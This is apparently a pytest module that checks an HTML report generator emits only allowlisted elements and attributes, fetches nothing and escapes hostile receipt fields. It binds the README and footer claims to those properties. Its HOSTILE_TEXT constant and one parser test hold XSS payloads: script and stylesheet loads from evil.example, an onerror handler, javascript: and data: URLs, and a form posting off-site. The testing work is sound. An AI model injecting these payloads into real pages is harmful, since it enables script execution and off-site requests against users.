"""Bind the report's offline and script-free claims to the rendered document.

Three published statements say the same thing about the HTML report, and until
now none of them was checked against the document:

- the report's own footer, which every reader sees: "No external assets,
  scripts, or network requests are used.";
- the README's Accessibility row: "The offline HTML report is static,
  script-free, and escaped."; and
- the README's Performance row, which declares the standard N/A because the
  report "pulls no subresources, so there is no delivery surface to budget".

`tests/test_report.py` asserted `"<script" not in first` on the clean fixture.
That is one substring against one input. It says nothing about event-handler
attributes, `javascript:` or `data:` URLs, `<iframe>`, `<object>`, a stylesheet
`@import`, or any `src` at all, and nothing about what happens when the payload
text is hostile rather than synthetic.

This module parses the rendered document with the standard library's HTML
parser rather than by substring, derives its element and attribute sets, and
requires them to stay inside a pinned allowlist. It then does the whole thing
again against a receipt whose free-text fields are markup, script URLs, and a
stylesheet import, because a safety property that only holds for well-behaved
input is not a safety property.

The claims themselves are bound too: each README sentence must be present, and
the property it asserts must hold of the document. A reworded claim fails here
rather than drifting away from what is enforced.
"""

from __future__ import annotations

from copy import deepcopy
from html.parser import HTMLParser
from pathlib import Path
from typing import cast

import pytest

from exitdrill.canonical import canonical_json_bytes, sha256_bytes
from exitdrill.evaluator import run_drill
from exitdrill.loader import load_baseline, load_export
from exitdrill.models import JsonValue
from exitdrill.receipt import build_receipt
from exitdrill.report import render_receipt_report

PROJECT = Path(__file__).parents[1]
README = PROJECT / "README.md"
EXAMPLE = PROJECT / "examples" / "synthetic-crm"

# Every element the report is allowed to emit. Pinned rather than merely
# screened against a danger list, so an element added later is a review point
# even if nobody thought to add it to a list of dangerous ones.
ALLOWED_ELEMENTS = frozenset(
    {
        "a",
        "body",
        "caption",
        "code",
        "dd",
        "div",
        "dl",
        "dt",
        "footer",
        "h1",
        "h2",
        "head",
        "header",
        "html",
        "li",
        "main",
        "meta",
        "p",
        "section",
        "span",
        "strong",
        "style",
        "table",
        "tbody",
        "td",
        "th",
        "thead",
        "title",
        "tr",
        "ul",
    }
)

# Every attribute the report is allowed to emit. `src` is absent on purpose:
# there is no element in the allowlist that would carry one, and nothing in the
# report may fetch anything.
ALLOWED_ATTRIBUTES = frozenset(
    {
        "aria-label",
        "aria-labelledby",
        "charset",
        "class",
        "content",
        "href",
        "http-equiv",
        "id",
        "lang",
        "name",
        "scope",
    }
)

CSP = "default-src 'none'; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'"

FOOTER_CLAIM = "No external assets, scripts, or network requests are used."
README_ACCESSIBILITY_CLAIM = "The offline HTML report is static, script-free, and escaped."
README_PERFORMANCE_CLAIM = (
    "the HTML report is written to a local path on demand and pulls no subresources, "
    "so there is no delivery surface to budget"
)

# Free text an attacker controls if they control the receipt. Every one of
# these is a different route to a fetch or an execution: markup, an event
# handler, two dangerous URL schemes, an off-origin absolute URL, a stylesheet
# import, and a CSS url() reference.
HOSTILE_TEXT = (
    '</title><script src="https://evil.example/x.js"></script>'
    '<img src=x onerror="alert(1)">'
    '<iframe src="javascript:alert(2)"></iframe>'
    '<style>@import url("https://evil.example/x.css");</style>'
    '<a href="javascript:alert(3)">go</a>'
    '<object data="data:text/html,<b>x</b>"></object>'
    '<form action="https://evil.example/post"><input name="a"></form>'
)


class _Document(HTMLParser):
    """Collect the element names, attribute names, hrefs, and style text."""

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.elements: set[str] = set()
        self.attributes: set[str] = set()
        self.hrefs: list[str] = []
        self.style_text: list[str] = []
        self._in_style = False

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self.elements.add(tag)
        for name, value in attrs:
            self.attributes.add(name)
            if name == "href":
                self.hrefs.append(value or "")
        if tag == "style":
            self._in_style = True

    def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self.handle_starttag(tag, attrs)

    def handle_endtag(self, tag: str) -> None:
        self.elements.add(tag)
        if tag == "style":
            self._in_style = False

    def handle_data(self, data: str) -> None:
        if self._in_style:
            self.style_text.append(data)


def parse(document: str) -> _Document:
    parsed = _Document()
    parsed.feed(document)
    parsed.close()
    return parsed


def _receipt() -> dict[str, JsonValue]:
    result = run_drill(
        load_baseline(EXAMPLE / "baseline.json"),
        load_export(EXAMPLE / "export.json"),
        EXAMPLE / "export-files",
    )
    return build_receipt(result, claimed_generated_at="2026-07-22T20:00:00Z")


def _hostile_receipt() -> dict[str, JsonValue]:
    receipt = _receipt()
    payload = cast(dict[str, JsonValue], receipt["payload"])
    payload["source_system"] = HOSTILE_TEXT
    payload["drill_id"] = HOSTILE_TEXT
    receipt["payload_sha256"] = sha256_bytes(canonical_json_bytes(payload))
    return receipt


def rendered(hostile: bool) -> str:
    return render_receipt_report(deepcopy(_hostile_receipt() if hostile else _receipt()))


BOTH = pytest.mark.parametrize("hostile", [False, True], ids=["synthetic", "hostile"])


# ---------------------------------------------------------------------------
# The parser must actually be reading the document.
# ---------------------------------------------------------------------------


def test_the_parser_reads_the_document_it_is_given() -> None:
    """A parser returning empty sets would satisfy every allowlist below."""
    parsed = parse(rendered(hostile=False))

    assert "html" in parsed.elements
    assert "table" in parsed.elements
    assert "lang" in parsed.attributes
    assert parsed.hrefs
    assert parsed.style_text
    assert "".join(parsed.style_text).strip()


def test_the_parser_finds_what_it_is_looking_for_when_it_is_present() -> None:
    """The allowlists only mean something if the parser can see a violation."""
    parsed = parse(
        '<html><body><script src="https://evil.example/x.js"></script>'
        '<img onerror="alert(1)">'
        '<style>@import url("https://evil.example/x.css");</style></body></html>'
    )

    assert {"script", "img"} <= parsed.elements
    assert {"src", "onerror"} <= parsed.attributes
    assert "@import" in "".join(parsed.style_text)


# ---------------------------------------------------------------------------
# The document's own surface, for synthetic and hostile payload text alike.
# ---------------------------------------------------------------------------


@BOTH
def test_report_emits_only_allowlisted_elements(hostile: bool) -> None:
    parsed = parse(rendered(hostile))

    assert parsed.elements <= ALLOWED_ELEMENTS, sorted(parsed.elements - ALLOWED_ELEMENTS)
    assert "html" in parsed.elements


@BOTH
def test_report_emits_only_allowlisted_attributes(hostile: bool) -> None:
    parsed = parse(rendered(hostile))

    assert parsed.attributes <= ALLOWED_ATTRIBUTES, sorted(parsed.attributes - ALLOWED_ATTRIBUTES)
    assert not [name for name in parsed.attributes if name.startswith("on")]
    assert "src" not in parsed.attributes


@BOTH
def test_every_link_stays_inside_the_document(hostile: bool) -> None:
    """No absolute URL, no scheme, no protocol-relative reference.

    The only link the report emits is the skip link, so this is not a filter to
    be tuned; anything else is a finding.
    """
    parsed = parse(rendered(hostile))

    assert parsed.hrefs
    for href in parsed.hrefs:
        assert href.startswith("#"), href


@BOTH
def test_the_stylesheet_fetches_nothing(hostile: bool) -> None:
    style = "".join(parse(rendered(hostile)).style_text)

    assert style.strip()
    assert "@import" not in style
    assert "url(" not in style


@BOTH
def test_the_content_security_policy_is_exact(hostile: bool) -> None:
    """`default-src 'none'` is the backstop if any assertion above ever slips."""
    document = rendered(hostile)

    assert f'<meta http-equiv="Content-Security-Policy" content="{CSP}">' in document


# ---------------------------------------------------------------------------
# The published claims, bound to the properties above.
# ---------------------------------------------------------------------------


def test_the_reports_own_footer_claim_is_present_and_true() -> None:
    """The claim every reader of a report sees, checked against the report.

    Presence is asserted so a reworded footer has to re-point this binding
    instead of quietly leaving the properties unclaimed or the claim unchecked.
    """
    document = rendered(hostile=True)
    parsed = parse(document)

    assert FOOTER_CLAIM in document
    assert "script" not in parsed.elements
    assert "src" not in parsed.attributes
    assert all(href.startswith("#") for href in parsed.hrefs)


def test_the_readme_accessibility_and_performance_claims_are_present_and_true() -> None:
    readme = README.read_text(encoding="utf-8")
    flat = " ".join(readme.split())
    parsed = parse(rendered(hostile=True))

    assert " ".join(README_ACCESSIBILITY_CLAIM.split()) in flat
    assert " ".join(README_PERFORMANCE_CLAIM.split()) in flat
    # script-free, and no subresource of any kind.
    assert not ({"script", "noscript", "iframe", "object", "embed"} & parsed.elements)
    assert "src" not in parsed.attributes
    assert "url(" not in "".join(parsed.style_text)


def test_the_claim_binding_can_report_a_missing_sentence() -> None:
    """Keeps the two tests above from passing on an empty or reworded README."""
    flat = " ".join(README.read_text(encoding="utf-8").split())

    assert "The offline HTML report is dynamic and unescaped." not in flat


# ---------------------------------------------------------------------------
# The hostile input is genuinely hostile, and is genuinely neutralised.
# ---------------------------------------------------------------------------


def test_the_hostile_payload_would_be_dangerous_unescaped() -> None:
    """Without this, the hostile cases could pass against inert placeholder text."""
    parsed = parse(f"<html><body>{HOSTILE_TEXT}</body></html>")

    assert {"script", "img", "iframe", "style", "a", "object", "form", "input"} <= parsed.elements
    assert {"src", "onerror", "href", "data", "action", "name"} <= parsed.attributes
    assert "@import" in "".join(parsed.style_text)


def test_the_hostile_payload_reaches_the_document_only_escaped() -> None:
    """The text must be present as text, or the hostile cases prove nothing.

    A renderer that dropped the field entirely would satisfy every allowlist
    above while telling us nothing about escaping.
    """
    document = rendered(hostile=True)

    assert HOSTILE_TEXT not in document
    assert "&lt;script src=&quot;https://evil.example/x.js&quot;&gt;" in document
    assert "&lt;img src=x onerror=&quot;alert(1)&quot;&gt;" in document
    assert "&lt;a href=&quot;javascript:alert(3)&quot;&gt;" in document
